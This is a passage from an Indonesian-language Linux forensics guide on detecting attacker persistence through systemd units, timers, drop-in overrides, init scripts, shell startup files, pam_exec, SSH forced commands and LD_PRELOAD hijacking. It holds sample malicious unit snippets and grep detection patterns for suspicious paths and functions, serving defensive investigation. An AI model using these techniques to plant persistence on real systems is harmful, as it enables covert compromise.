> 📌 **Cara mengenali generator custom mencurigakan:** Generator bawaan sistem (fstab-generator, cryptsetup-generator, dll) adalah bagian resmi paket `systemd` — bandingkan isi `/usr/lib/systemd/system-generators/` dengan daftar yang **seharusnya** ada di instalasi bersih distro yang sama. File tambahan yang tidak dikenal di direktori ini (apalagi kalau dibuat/dimodifikasi belakangan — cek mtime sesuai Prinsip Umum §6.2) adalah indikasi kuat generator disalahgunakan untuk persistence.

---

#### 6.4.5 Pola Malicious Service

Menggabungkan §6.4.1-6.4.4 jadi pola konkret yang sering ditemukan:

| Pola | Detail |
|---|---|
| `ExecStart` menunjuk lokasi tidak standar | `/tmp/`, `/dev/shm/`, `/var/tmp/` (Bab 1 §1.2.6), atau home directory user biasa |
| Nama unit menyamar sebagai service legit | `systemd-networkd-helper.service`, `network-manager-sync.service` — mirip nama resmi tapi bukan bagian paket asli |
| `Description` generik/kosong | Berbeda dari unit resmi yang biasanya deskriptif jelas |
| `Restart=always` + interval pendek | Memastikan proses "bangkit lagi" walau di-kill manual investigator/admin |
| Dibuat lewat `~/.config/systemd/user/` | Persistence tanpa perlu privilege root sama sekali (§6.4.2) |
| State `enabled` tapi `Description` tidak cocok fungsi `ExecStart` sebenarnya | Ketidakcocokan antara "yang diklaim" vs "yang benar-benar dilakukan" |

```bash
# Cari service dengan ExecStart mencurigakan di seluruh lokasi unit sekaligus
grep -r "ExecStart" /etc/systemd/system/ /usr/lib/systemd/system/ /run/systemd/system/ 2>/dev/null | \
    grep -E "/tmp/|/dev/shm/|/var/tmp/"

# Bandingkan daftar service ter-install dengan paket resmi
systemctl list-unit-files --type=service | grep enabled
dpkg -S /etc/systemd/system/<nama_unit>.service 2>/dev/null    # kalau kosong = bukan dari paket resmi
```

---

#### 6.4.6 systemd Timer sebagai Pengganti Cron Modern

**Pengertian & Fungsi:**
Timer unit (`.timer`) adalah cara systemd-native untuk penjadwalan — banyak distro modern **memindahkan** `cron.daily`/`cron.hourly` (§6.3.1) ke timer, dan attacker bisa memakai mekanisme yang sama untuk persistence terjadwal tanpa menyentuh cron sama sekali.

```ini
# /etc/systemd/system/backup-sync.timer
[Unit]
Description=Run backup-sync periodically

[Timer]
OnBootSec=5min
OnUnitActiveSec=1h
Unit=backup-sync.service    ← merujuk ke .service yang benar-benar dieksekusi

[Install]
WantedBy=timers.target
```

| Field Timer | Fungsi |
|---|---|
| `OnBootSec` | Jalan sekian waktu setelah boot |
| `OnUnitActiveSec` | Jalan berkala tiap interval sejak eksekusi terakhir |
| `OnCalendar` | Jadwal absolut mirip syntax cron tapi format berbeda (`OnCalendar=*-*-* 03:00:00`) |

```bash
# List semua timer aktif beserta jadwal berikutnya
systemctl list-timers --all

# Cek unit .service yang DIPICU oleh timer mencurigakan
systemctl cat <nama>.timer
```

> ⚠️ **Kenapa perlu dicek terpisah dari §6.3 cron:** Investigator yang cuma cek cron (§6.3) tapi lupa `systemctl list-timers` akan melewatkan seluruh kategori penjadwalan ini — apalagi di distro yang sudah migrasi penuh ke systemd timer dan cron classic-nya minim/tidak dipakai default.

---

#### 6.4.7 Socket & Path Activation — Trigger Chain

**Pengertian & Fungsi:**
Dua mekanisme activation berbasis **event**, bukan jadwal waktu — service baru benar-benar dijalankan **saat** event tertentu terjadi, bukan berkala.

```
Socket Activation:
.socket unit (mendengarkan di PORT/socket tertentu)
      │
      ▼  (koneksi masuk ke socket tsb)
   TRIGGER
      │
      ▼
.service unit dengan NAMA SAMA otomatis dijalankan untuk handle koneksi itu

Path Activation:
.path unit (memantau PATH/direktori tertentu untuk perubahan)
      │
      ▼  (file baru muncul / dimodifikasi di path yang dipantau)
   TRIGGER
      │
      ▼
.service unit dengan NAMA SAMA otomatis dijalankan
```

```ini
# Contoh .path — /etc/systemd/system/watch-upload.path
[Path]
PathModified=/var/www/uploads/

[Install]
WantedBy=multi-user.target
```

```ini
# .service pasangannya — /etc/systemd/system/watch-upload.service (nama harus sama persis)
[Service]
ExecStart=/usr/local/bin/process-upload.sh
Type=oneshot
```

> ⚠️ **Nilai forensik & kenapa ini teknik yang cukup halus:** Kombinasi `.path` + `.service` ini bisa dipakai attacker sebagai **trigger persistence berbasis file drop** — misalnya memantau folder upload web app, begitu ada file baru (webshell tahap dua, misal), otomatis dieksekusi lewat service terpisah. Investigator yang cuma cek `.service` **standalone** tanpa menyadari ada `.path`/`.socket` yang memicunya akan kebingungan kenapa service tsb "kadang jalan kadang tidak" — kuncinya selalu cek **pasangan unit** dengan nama sama, bukan cuma satu file.

```bash
# Cari semua .path dan .socket beserta .service pasangannya
systemctl list-units --type=path
systemctl list-units --type=socket
# Untuk tiap hasil, cek unit .service dengan NAMA SAMA
systemctl cat <nama_yang_sama>.service
```

---

#### 6.4.8 Drop-in Override (.d/ Directories)

**Pengertian & Fungsi:**
systemd mengizinkan **override parsial** sebuah unit tanpa mengedit file aslinya — lewat direktori `<nama_unit>.service.d/` berisi file `.conf` tambahan yang di-**merge** ke konfigurasi asli saat unit dimuat. Ini teknik lebih halus dibanding bikin unit baru sepenuhnya, karena unit "resmi" yang terlihat tidak berubah sama sekali di lokasi aslinya.

```
/etc/systemd/system/
├── sshd.service.d/                      ← direktori drop-in untuk unit "sshd.service"
│   └── 99-override.conf                   (angka di depan menentukan urutan merge)
└── (unit asli sshd.service sendiri TIDAK ADA DI SINI — dia ada di /usr/lib/systemd/system/,
     drop-in ini MENAMBAH/MENIMPA sebagian konfigurasinya saja)
```

```ini
# Contoh isi 99-override.conf yang berbahaya
[Service]
ExecStartPost=/tmp/.hidden/persistence.sh
```

> ⚠️ **Kenapa teknik ini sangat halus:** `systemctl cat sshd.service` akan menampilkan unit asli **DIGABUNG** dengan override-nya — tapi kalau investigator cuma `cat` file unit asli secara langsung (bukan pakai `systemctl cat`), drop-in override ini **tidak akan terlihat sama sekali**, karena secara fisik ada di direktori terpisah (`sshd.service.d/`), bukan mengubah isi file `sshd.service` itu sendiri.

```bash
# WAJIB pakai 'systemctl cat', BUKAN 'cat' langsung, untuk melihat konfigurasi EFEKTIF
# (gabungan unit asli + semua drop-in override)
systemctl cat sshd.service

# Cari SEMUA direktori drop-in di sistem sekaligus
find /etc/systemd/system/ -type d -name "*.d"
find /etc/systemd/system/ -type d -name "*.d" -exec ls -la {} \;
```

---

#### 6.4.9 Dari ExecStart ke File Timeline — Workflow

**Pengertian & Fungsi:**
Menyatukan §6.4.1-6.4.8 jadi satu alur konkret — menghubungkan Bab 6 balik ke Bab 2 (filesystem) dan Bab 3 (log), persis prinsip korelasi yang jadi tema besar seri ini.

```
[1] Ditemukan unit mencurigakan
      │
      ▼
[2] Baca ExecStart= (§6.4.1) — CEK JUGA EnvironmentFile= kalau ada
      │
      ▼
[3] Identifikasi executable/script yang dirujuk ExecStart
      │
      ▼
[4] Inspeksi executable itu sendiri:
      - stat (owner, permission, mtime/ctime — §2.1.6 Bab 2)
      - hash (bandingkan dengan baseline/VirusTotal)
      - file <path>  (tipe file — ELF binary? Script? Symlink?)
      - kalau ELF: cek strings/imported library untuk indikasi fungsi
      │
      ▼
[5] Cek Journal (Bab 3 §3.4) untuk log eksekusi unit ini
      journalctl -u <nama_unit>.service --no-pager
      → kapan service ini pernah start/stop/restart/gagal
      │
      ▼
[6] Kalau sistem live: cek process & network evidence
      ps aux | grep <nama_proses>
      ss -tulpn | grep <PID>       # koneksi jaringan yang dibuka proses ini
      lsof -p <PID>                 # file yang dibuka proses ini
```

> 💡 **Kenapa workflow ini penting sebagai penutup §6.4:** Unit file cuma menjawab "apa yang **dikonfigurasi** untuk jalan" — langkah 4-6 yang menjawab "apa yang **benar-benar terjadi**". Kombinasi keduanya (konfigurasi + eksekusi + jejak runtime) adalah standar pembuktian yang jauh lebih kuat daripada berhenti di langkah 1-2 saja.

---

#### 6.4.10 Forensik systemd

Rangkuman command inti dari §6.4.1-6.4.9, plus tambahan untuk investigasi cepat:

```bash
# Enumerasi cepat SEMUA unit beserta state-nya (§6.4.3)
systemctl list-unit-files --type=service
systemctl list-unit-files --type=timer
systemctl list-unit-files --type=socket
systemctl list-unit-files --type=path

# Detail satu unit (konfigurasi EFEKTIF, termasuk drop-in override §6.4.8)
systemctl cat <nama_unit>

# Status runtime (aktif/tidak, PID, log terakhir singkat)
systemctl status <nama_unit>

# Log historis lengkap untuk satu unit (Bab 3 §3.4)
journalctl -u <nama_unit> --no-pager

# Enumerasi generator & hasil generate-nya (§6.4.4)
ls -la /usr/lib/systemd/system-generators/ /etc/systemd/system-generators/
ls -la /run/systemd/generator/

# Enumerasi unit user-level untuk SEMUA user (§6.4.2)
for home in /home/*; do
    sudo -u "$(basename "$home")" systemctl --user list-unit-files 2>/dev/null
done

# Cari file unit yang dimodifikasi belakangan (Prinsip Umum §6.2)
sudo find /etc/systemd/system /usr/lib/systemd/system -name "*.service" -newer /etc/hostname -exec stat {} \;
```

---

### 6.5 Init Scripts (SysV & Legacy)

#### 6.5.1 SysV Init Overview

**Pengertian & Fungsi:**
Sebelum systemd, Linux memakai SysV init — service didefinisikan sebagai **script shell** di `/etc/init.d/`, diaktifkan/dinonaktifkan lewat symlink di direktori runlevel (`/etc/rcX.d/`).

```
/etc/init.d/
└── my-service              ← script shell asli (menerima argumen start/stop/restart)

/etc/rc2.d/                  ← symlink untuk runlevel 2 (multi-user, umum jadi default)
├── S20my-service   →  ../init.d/my-service    (S = Start, dijalankan saat masuk runlevel ini)
└── K20my-service   →  ../init.d/my-service    (K = Kill, dijalankan saat KELUAR dari runlevel ini)
```

| Prefix Symlink | Arti | Angka (mis. `20`) |
|---|---|---|
| `S` (Start) | Dijalankan dengan argumen `start` saat masuk runlevel ini | Urutan eksekusi — angka lebih kecil dijalankan lebih dulu |
| `K` (Kill) | Dijalankan dengan argumen `stop` saat keluar dari runlevel ini | Urutan sama, menentukan urutan shutdown |

```bash
# Cek semua script init.d
ls -la /etc/init.d/

# Cek symlink runlevel — mana yang aktif (S) di runlevel default sistem
ls -la /etc/rc2.d/ /etc/rc3.d/ /etc/rc5.d/
```

---

#### 6.5.2 Kenapa Masih Relevan

Meski systemd dominan di distro modern, SysV init **tidak sepenuhnya hilang**:

| Konteks | Alasan Masih Relevan |
|---|---|
| **Compatibility layer** | systemd menyediakan `systemd-sysv-generator` yang otomatis membungkus script `/etc/init.d/` lama jadi unit systemd "semu" — script lama tetap bisa dipanggil lewat `systemctl` walau aslinya bukan native unit systemd |
| **Distro/sistem lama** | Server legacy yang belum upgrade, atau distro tertentu yang masih memilih SysV (jarang tapi ada) |
| **Embedded/minimal system** | Sistem embedded kadang pakai init lebih sederhana (BusyBox init, dll) dengan struktur mirip SysV |
| **Docker/container** | Beberapa base image container tanpa systemd penuh kadang masih memakai skrip mirip init.d untuk startup sederhana |

> 📖 **Cross-reference generator:** Fenomena "script init.d lama tetap bisa dikelola `systemctl`" ini contoh nyata konsep generator yang sudah dibahas di §6.4.4 — `systemd-sysv-generator` men-generate unit semu untuk tiap script `/etc/init.d/` yang ditemukan, supaya kompatibel dengan tooling systemd modern.

```bash
# Cek apakah sebuah script init.d "terlihat" sebagai unit systemd (via generator compat)
systemctl status <nama_script>
```

---

#### 6.5.3 Forensik Init Script

```bash
# Baca isi script (ini SCRIPT SHELL PENUH, bukan cuma satu baris command seperti cron)
cat /etc/init.d/<nama_script>

# Owner & permission (Prinsip Umum §6.2)
stat /etc/init.d/<nama_script>

# Cek executable bit — script init.d WAJIB executable untuk bisa dipanggil
ls -la /etc/init.d/ | grep -v "^-rwxr"

# Cari symlink runlevel yang tidak wajar (nama tidak dikenal di antara service resmi)
ls -la /etc/rc*.d/ | grep -v "^total"
```

> ⚠️ **Beda karakteristik forensik dari cron/systemd:** Script init.d adalah **shell script penuh**, bukan satu baris command (cron) atau konfigurasi terstruktur (`ExecStart=` systemd) — analisis isinya lebih mirip analisis malware/script biasa (dibahas lebih dalam di bab Malware & Rootkit Analysis) daripada sekadar membaca satu field konfigurasi.

---

### 6.6 Shell & Login-Time Persistence

#### 6.6.1 Shell Startup Files sebagai Persistence

> 📖 **Cross-reference eksplisit:** Bab 4 §4.12 sudah memperkenalkan file ini (`.bashrc`, `.bash_profile`, `.profile`, `.zshrc`) dari sudut pandang artefak history/konfigurasi, dengan pola berbahaya dasar (command asing, alias override) sudah disebutkan di sana. Bagian ini **melengkapi** dari sudut pandang persistence — kapan tepatnya tiap file dieksekusi, dan checklist lokasi yang perlu dicek per-user.

```
Urutan eksekusi shell startup (Bash, disederhanakan):

Login shell (SSH login, console login):
  /etc/profile → /etc/profile.d/*.sh (§6.6.2) → ~/.bash_profile (atau ~/.bash_login,
  atau ~/.profile — dipakai SALAH SATU sesuai urutan prioritas Bash)

Interactive non-login shell (buka terminal baru dalam sesi yang sudah login):
  /etc/bash.bashrc → ~/.bashrc

Logout:
  ~/.bash_logout
```

> ⚠️ **Kenapa distinction "login vs non-login shell" penting untuk forensik:** Attacker yang paham perbedaan ini bisa memilih **secara sengaja** taruh payload di file yang cuma jalan sekali per-login (`.bash_profile` — lebih jarang dicek karena "cuma jalan pas login") vs file yang jalan **setiap kali** buka terminal baru (`.bashrc` — lebih sering dieksekusi tapi juga lebih sering diperhatikan user). Checklist investigasi wajib cek **semua** varian, bukan cuma `.bashrc` yang paling terkenal.

```bash
# Checklist lengkap per-user (loop semua user, sama prinsipnya dengan cron §6.3.3)
for home in /home/* /root; do
    echo "=== Shell startup files: $home ==="
    ls -la "$home"/.bashrc "$home"/.bash_profile "$home"/.profile "$home"/.bash_login \
           "$home"/.zshrc "$home"/.bash_logout 2>/dev/null
done

# Baca isi SEMUA sekaligus, filter komentar/baris kosong untuk fokus ke isi substantif
for f in ~/.bashrc ~/.bash_profile ~/.profile; do
    echo "=== $f ==="
    grep -viE "^#|^$" "$f" 2>/dev/null
done
```

---

#### 6.6.2 `/etc/profile.d/` — System-wide Startup Hook

**Pengertian & Fungsi:**
Direktori drop-in yang di-source otomatis oleh `/etc/profile` untuk **setiap login shell**, di **setiap user** — mirip peran `/etc/cron.d/` untuk cron (§6.3.1), tapi untuk startup shell.

```
/etc/profile
    └── source semua file di:
         /etc/profile.d/*.sh
              ├── 01-locale.sh          ← contoh legit (setup locale sistem)
              ├── 02-vte.sh              ← contoh legit (terminal emulator setup)
              └── 99-custom-hook.sh       ← BISA JADI persistence kalau attacker taruh di sini
```

> ⚠️ **Kenapa ini lebih berbahaya dari `.bashrc` per-user:** Satu file di `/etc/profile.d/` (butuh privilege root untuk menulisnya) berdampak ke **SEMUA user** yang login secara shell di sistem tsb sekaligus — cakupan yang jauh lebih luas dibanding menaruh payload di satu `.bashrc` milik satu user saja.

```bash
ls -la /etc/profile.d/
cat /etc/profile.d/*.sh
```

---

#### 6.6.3 PAM-Based Persistence

> 📖 **Cross-reference eksplisit:** Bab 4 §4.7 sudah membahas struktur `/etc/pam.d/` dan memperkenalkan konsep PAM backdoor di §4.7.4 secara pengantar. Bagian ini fokus khusus ke **`pam_exec`** sebagai mekanisme paling konkret untuk persistence lewat PAM.

**Pengertian & Fungsi:**
`pam_exec` adalah modul PAM resmi yang mengizinkan admin menjalankan **command eksternal apapun** di titik-titik tertentu proses autentikasi (login, sudo, dst) — legitimate untuk logging/notifikasi tambahan, tapi mudah disalahgunakan.

```
# Contoh baris di /etc/pam.d/sshd atau /etc/pam.d/common-auth
session    optional    pam_exec.so /usr/local/bin/notify-login.sh
```

> ⚠️ **Kenapa ini persistence yang sangat kuat:** Command yang dipanggil `pam_exec` dieksekusi **setiap kali** ada aktivitas autentikasi terkait (setiap login SSH, setiap `sudo`, tergantung file PAM mana yang disisipi) — attacker bisa memakainya untuk trigger reverse shell setiap kali user tertentu login, atau bahkan **mencuri password** (karena beberapa titik hook PAM punya akses ke password plaintext sebelum di-hash, tergantung modul dan urutan stack).

```bash
# Cari SEMUA baris pam_exec di seluruh konfigurasi PAM
grep -r "pam_exec" /etc/pam.d/

# Inspeksi command yang dirujuk
cat /usr/local/bin/notify-login.sh    # (path sesuai hasil grep di atas)
```

---

#### 6.6.4 SSH-Based Persistence

> 📖 **Cross-reference eksplisit:** Bab 4 §4.13 sudah membahas `authorized_keys`, `~/.ssh/config`, dan `sshd_config` secara struktural. Bagian ini menambahkan **dua mekanisme spesifik** yang sudah disinggung sekilas di sana tapi belum didalami dari sudut persistence.

| Mekanisme | Cara Kerja | Lokasi |
|---|---|---|
| **`command=` option di `authorized_keys`** | Memaksa command TERTENTU dijalankan setiap kali key ini dipakai login, TERLEPAS dari command yang diminta user — bisa dipakai attacker untuk memastikan payload jalan tiap kali mereka login pakai key tsb | `~/.ssh/authorized_keys`, sudah disebut sekilas di Bab 4 §4.13.2 |
| **`ForceCommand` di `sshd_config`** | Sama prinsipnya tapi di level **server-wide** (bukan per-key) — SEMUA login SSH (atau untuk `Match` block tertentu) dipaksa jalankan command ini | `/etc/ssh/sshd_config` |
| **`~/.ssh/rc` (sshrc)** | Script yang dieksekusi otomatis oleh `sshd` setiap sesi SSH berhasil login (mirip shell startup tapi spesifik SSH, dieksekusi SEBELUM shell user dimulai) | `~/.ssh/rc` |

```bash
# Cek command= di semua authorized_keys (loop semua user)
for home in /home/* /root; do
    grep "command=" "$home/.ssh/authorized_keys" 2>/dev/null
done

# Cek ForceCommand di sshd_config
grep -i "ForceCommand" /etc/ssh/sshd_config

# Cek sshrc — sering terlewat karena jarang dipakai untuk tujuan legitimate
find /home /root -name "rc" -path "*/.ssh/*" 2>/dev/null -exec cat {} \;
```

> ⚠️ **Kenapa `~/.ssh/rc` paling sering terlewat:** Dari tiga mekanisme di atas, `sshrc` adalah yang paling jarang dipakai untuk tujuan legitimate (kebanyakan environment tidak pernah menyentuhnya sama sekali) — justru karena itu, keberadaannya **sama sekali** (bukan cuma isinya) sudah patut dicurigai di kebanyakan sistem.

---

### 6.7 LD_PRELOAD & Dynamic Linker Hijacking

#### 6.7.1 Konsep Dynamic Linking & LD_PRELOAD

**Pengertian & Fungsi:**
Kebanyakan binary Linux tidak "mandiri penuh" — mereka bergantung pada **shared library** (`.so` files) yang dimuat saat runtime oleh **dynamic linker** (`ld.so`/`ld-linux.so`). `LD_PRELOAD` adalah mekanisme resmi yang mengizinkan **memaksa** linker memuat library tertentu **lebih dulu** dari yang seharusnya — dirancang untuk debugging/override fungsi legitimate, tapi jadi salah satu teknik hijacking paling ampuh di Linux.

```
Proses normal tanpa LD_PRELOAD:
  binary dijalankan → ld.so cari fungsi (mis. fopen()) → ketemu di libc.so → dipanggil

Proses DENGAN LD_PRELOAD:
  binary dijalankan → ld.so LEBIH DULU cek library di LD_PRELOAD →
  kalau library itu punya fungsi dengan NAMA SAMA (mis. fopen() versi jahat) →
  fungsi versi JAHAT itu yang dipanggil, BUKAN yang asli di libc.so →
  (versi jahat bisa memanggil versi asli di baliknya, jadi user/proses TIDAK SADAR
   ada yang disisipkan — "transparent hijacking")
```

> 💡 **Kenapa ini teknik paling "senyap" di seluruh Bab 6:** Berbeda dari cron/systemd yang punya jejak konfigurasi eksplisit (baris crontab, unit file), LD_PRELOAD bekerja di level **fungsi library** — begitu aktif, **SETIAP proses baru** yang dijalankan (bukan cuma satu service tertentu) berpotensi terpengaruh, tanpa ada "satu titik konfigurasi besar" yang mudah ditemukan seperti unit file systemd.

---

#### 6.7.2 `/etc/ld.so.preload` vs Environment Variable — Forensic Distinction

**Pengertian & Fungsi:**
LD_PRELOAD bisa diaktifkan lewat **dua cara berbeda** dengan cakupan dan jejak forensik yang **sangat berbeda** — perbedaan ini krusial dan sering disalahpahami.

| Metode | Cakupan | Persisten? | Lokasi Jejak |
|---|---|---|---|
| **`/etc/ld.so.preload`** | **System-wide** — mempengaruhi SEMUA proses di seluruh sistem yang memakai dynamic linker standar | ✅ Ya, sampai file ini dihapus/diedit manual | Satu file, mudah dicek |
| **Environment variable `LD_PRELOAD`** | **Per-proses/per-sesi** — cuma mempengaruhi proses yang dijalankan dengan environment variable ini di-set | ❌ Tidak persisten dengan sendirinya (kecuali di-set lewat mekanisme persistence LAIN, misal `.bashrc` §6.6.1 atau `ExecStart` dengan `Environment=` §6.4.1) | Tersebar — bisa di environment shell manapun, unit file manapun, service manapun |

```bash
# Cek metode SYSTEM-WIDE (paling mudah dicek, satu file)
cat /etc/ld.so.preload

# Cek metode ENVIRONMENT VARIABLE — JAUH LEBIH SULIT karena tersebar,
# harus dicek di SEMUA tempat yang bisa set environment variable:

# [a] Shell startup files (§6.6.1)
grep -r "LD_PRELOAD" /home/*/.bashrc /home/*/.profile /root/.bashrc 2>/dev/null

# [b] systemd unit Environment=/EnvironmentFile= (§6.4.1)
grep -r "LD_PRELOAD" /etc/systemd/system/*.service 2>/dev/null

# [c] Proses yang SEDANG BERJALAN (sistem live) — cek environment aktualnya langsung
for pid in $(pgrep -f .); do
    tr '\0' '\n' < /proc/$pid/environ 2>/dev/null | grep "^LD_PRELOAD="
done

# [d] /etc/environment (system-wide environment variable, terpisah dari ld.so.preload)
grep "LD_PRELOAD" /etc/environment 2>/dev/null
```

> ⚠️ **Kesalahan investigasi paling fatal di area ini:** Menyimpulkan **"LD_PRELOAD tidak dipakai"** hanya karena `/etc/ld.so.preload` kosong/tidak ada. Ini **keliru** — metode environment variable sama sekali tidak bergantung pada file tersebut, dan justru **lebih sering** dipakai attacker karena jejaknya lebih tersebar dan sulit dicek menyeluruh dibanding satu file system-wide yang jelas lokasinya. Selalu cek **kedua** metode secara terpisah, jangan berhenti setelah satu ketemu kosong.

---

#### 6.7.3 `ld.so.conf`/`ld.so.conf.d` — Library Path Hijacking

**Pengertian & Fungsi:**
Berbeda dari LD_PRELOAD (memaksa load library tertentu **duluan**), `ld.so.conf` mengatur **direktori mana saja** yang dicari dynamic linker untuk menemukan shared library — kalau attacker bisa menambah direktori kontrol mereka ke daftar ini (atau menaruh library jahat di direktori yang sudah ada dalam daftar dengan **nama sama** seperti library resmi), linker berpotensi memuat versi jahat itu.

```
/etc/ld.so.conf
    └── include /etc/ld.so.conf.d/*.conf     ← direktori drop-in, mirip pola /etc/cron.d/ (§6.3.1)
                                                 dan /etc/profile.d/ (§6.6.2)

Cache hasil kompilasi (dibuat oleh 'ldconfig' dari isi ld.so.conf & ld.so.conf.d/):
/etc/ld.so.cache      ← binary cache, dynamic linker baca INI saat runtime (bukan .conf langsung)
```

```bash
# Cek isi konfigurasi path library
cat /etc/ld.so.conf
cat /etc/ld.so.conf.d/*.conf

# Cek cache yang benar-benar dipakai runtime (setelah 'ldconfig' terakhir dijalankan)
ldconfig -p | less
```

> ⚠️ **Nilai forensik:** Direktori tambahan di `ld.so.conf.d/` yang tidak dikenal (bandingkan dengan baseline paket resmi, sama prinsipnya dengan §6.4.5) bisa mengindikasikan attacker menambahkan path kontrol mereka sendiri ke pencarian library sistem — dikombinasikan dengan library jahat bernama sama seperti library populer (`libc.so.6` palsu, misal) di direktori tsb.

---

#### 6.7.4 setuid/setgid & Keterbatasan LD_PRELOAD

**Pengertian & Fungsi:**
LD_PRELOAD **tidak bekerja pada semua proses tanpa terkecuali** — kernel Linux punya perlindungan bawaan untuk mencegah eskalasi privilege lewat mekanisme ini pada binary tertentu.

```
Binary BIASA (tanpa setuid/setgid):
  LD_PRELOAD (env variable) BEKERJA NORMAL — linker akan memuat library yang direferensikan

Binary SETUID/SETGID (dijalankan dengan privilege pemilik file, bukan privilege user yang
menjalankan — contoh: /usr/bin/sudo, /usr/bin/passwd):
  LD_PRELOAD (env variable) DIABAIKAN oleh secure-execution mode dynamic linker
  → ini mencegah user biasa memakai LD_PRELOAD untuk "membajak" fungsi di binary
    privileged demi eskalasi ke root

  NAMUN: /etc/ld.so.preload (system-wide, §6.7.2) TETAP DIPROSES bahkan untuk
  binary setuid/setgid — karena file ini butuh privilege ROOT untuk ditulis
  sejak awal, jadi tidak dianggap sebagai vektor privilege escalation dari user biasa
```

> 💡 **Kenapa distinction ini penting supaya tidak salah kesimpulan:** Kalau investigator menemukan environment variable `LD_PRELOAD` di-set untuk sebuah proses, tapi proses itu adalah binary setuid (`sudo`, `passwd`, dst), library yang direferensikan **tidak akan benar-benar termuat** — jangan buru-buru simpulkan itu berhasil hijacking tanpa verifikasi lebih lanjut. Sebaliknya, `/etc/ld.so.preload` **selalu** perlu dicurigai serius kapanpun ditemukan, karena tidak ada pengecualian secure-execution untuknya (dan karena butuh privilege root untuk dibuat sejak awal, keberadaannya sendiri sudah jadi sinyal kuat sistem sudah terkompromi di level root).

```bash
# Cek apakah sebuah binary setuid/setgid (relevan untuk assess apakah LD_PRELOAD env-nya efektif)
ls -la /usr/bin/sudo /usr/bin/passwd
# Perhatikan bit 's' di kolom permission (rwsr-xr-x, dst)

# Cari SEMUA binary setuid/setgid di sistem (juga relevan silang ke Bab 2 §2.1.4 — capabilities)
sudo find / -perm -4000 -o -perm -2000 2>/dev/null
```

---

#### 6.7.5 Forensik LD_PRELOAD

Menggabungkan §6.7.1-6.7.4 jadi checklist investigasi:

```bash
# [1] Metode system-wide (§6.7.2)
cat /etc/ld.so.preload

# [2] Metode environment variable — cek SEMUA sumber potensial (§6.7.2)
grep -r "LD_PRELOAD" /home/*/.bashrc /home/*/.profile /root/.bashrc \
    /etc/environment /etc/systemd/system/*.service 2>/dev/null

# [3] Kalau sistem LIVE — cek proses berjalan yang punya LD_PRELOAD aktif
for pid in $(pgrep -f .); do
    env_out=$(tr '\0' '\n' < /proc/$pid/environ 2>/dev/null | grep "^LD_PRELOAD=")
    [ -n "$env_out" ] && echo "PID $pid: $env_out"
done

# [4] Kalau ketemu library mencurigakan (dari langkah 1-3), inspeksi library itu sendiri
file /path/ke/library.so
strings /path/ke/library.so | grep -iE "socket|exec|system|connect"    # heuristik fungsi mencurigakan
ldd /usr/bin/beberapa_binary | grep -i library_mencurigakan            # binary apa saja yang memuatnya

# [5] Cek library path hijacking (§6.7.3)
cat /etc/ld.so.conf.d/*.conf
ldconfig -p | grep -v "/usr/lib\|/lib"    # cari path TIDAK STANDAR di cache library
```

> 📌 **Kombinasi paling kuat untuk laporan:** "Ditemukan `/etc/ld.so.preload` berisi referensi ke `/usr/lib/libselinux-helper.so` (nama menyamar library resmi), file dimiliki root, dibuat 2 hari lalu (mtime — Prinsip Umum §6.2), berisi fungsi `execve` yang di-hook (dari `strings`), dan proses `sshd` yang sedang berjalan mengkonfirmasi library ini termuat (`lsof -p <pid_sshd> | grep libselinux-helper`)" — jauh lebih kuat daripada sekadar "ada file di ld.so.preload".

---

### 6.8 Mekanisme Persistence Lain (Overview Singkat)

> 📖 Bagian ini sengaja ringkas — mekanisme di bawah relevan tapi lebih niche dibanding §6.3-6.7, atau sudah beririsan dengan bab lain.

| Mekanisme | Pengertian Singkat | Lokasi/Cek |
|---|---|---|
| **udev rules** | Script yang dijalankan otomatis saat KERNEL mendeteksi event device (USB dicolok, dst) — attacker bisa memicu payload lewat event device tertentu | `/etc/udev/rules.d/`, cari rule dengan `RUN+=` yang menunjuk script mencurigakan |
| **XDG Autostart** | Aplikasi/script yang otomatis jalan saat **desktop environment** (GNOME/KDE/dst) start — relevan untuk sistem Linux dengan GUI, bukan server headless | `~/.config/autostart/`, `/etc/xdg/autostart/` — format file `.desktop` dengan field `Exec=` |
| **Package manager hooks** | Script yang dijalankan otomatis oleh `apt`/`dpkg`/`yum`/`rpm` pada event tertentu (sebelum/sesudah install/upgrade paket) | `/etc/apt/apt.conf.d/` (Debian/Ubuntu, cari `DPkg::Pre-Invoke`/`Post-Invoke`), `/etc/rpm/macros` (RHEL-based) |
| **Capability/SUID backdoor** | Sudah dibahas detail di Bab 2 §2.1.4 (`security.capability` xattr) — binary dengan capability/SUID yang tidak wajar sebagai jalur privilege escalation persisten | Cross-reference langsung ke Bab 2 §2.1.4, jangan diulang di sini |

```bash
# udev rules — cari RUN+= mencurigakan
grep -r "RUN+=" /etc/udev/rules.d/

# XDG autostart — cek system-wide DAN per-user
cat /etc/xdg/autostart/*.desktop 2>/dev/null
for home in /home/*; do cat "$home/.config/autostart/"*.desktop 2>/dev/null; done

# Package manager hooks
cat /etc/apt/apt.conf.d/* 2>/dev/null | grep -i "pre-invoke\|post-invoke"
```

---

### 6.9 Korelasi Titik Persistence vs Metode Deteksi (Tabel Master)

| Titik Persistence | Command Enumerasi Kunci | Perlu Cek State Terpisah? | Bagian |
|---|---|---|---|
| Cron system-wide | `cat /etc/crontab`, `cat /etc/cron.d/*` | Tidak — kalau ada di file, aktif | §6.3.1-6.3.3 |
| Cron per-user | `crontab -l -u <user>` (loop SEMUA user) | Tidak | §6.3.3 |
| systemd service | `systemctl list-unit-files` | **Ya** — cek enabled/disabled/masked/static (§6.4.3) | §6.4.1-6.4.5 |
| systemd generator | `ls /run/systemd/generator/` | Ya — cuma ada saat runtime | §6.4.4 |
| systemd timer | `systemctl list-timers --all` | Ya, sama seperti service | §6.4.6 |
| systemd socket/path | `systemctl list-units --type=socket,path` | Ya, plus cek `.service` pasangannya | §6.4.7 |
| systemd drop-in override | `systemctl cat <unit>` (BUKAN `cat` biasa) | Ya, tersembunyi dari file asli | §6.4.8 |
| systemd user-level unit | `systemctl --user list-unit-files` (loop semua user) | Ya, sama seperti system service | §6.4.2 |
| systemd transient unit | `systemctl list-units` (sistem LIVE saja) | Ya, tidak ada file di disk | §6.4.3 |
| SysV init script | `ls /etc/init.d/`, cek symlink `/etc/rcX.d/` | Tidak langsung, tapi cek symlink S/K | §6.5 |
| Shell startup file | Loop per-user `.bashrc`/`.profile`/dst | Tidak | §6.6.1 |
| `/etc/profile.d/` | `ls /etc/profile.d/` | Tidak | §6.6.2 |
| PAM (`pam_exec`) | `grep -r pam_exec /etc/pam.d/` | Tidak | §6.6.3 |
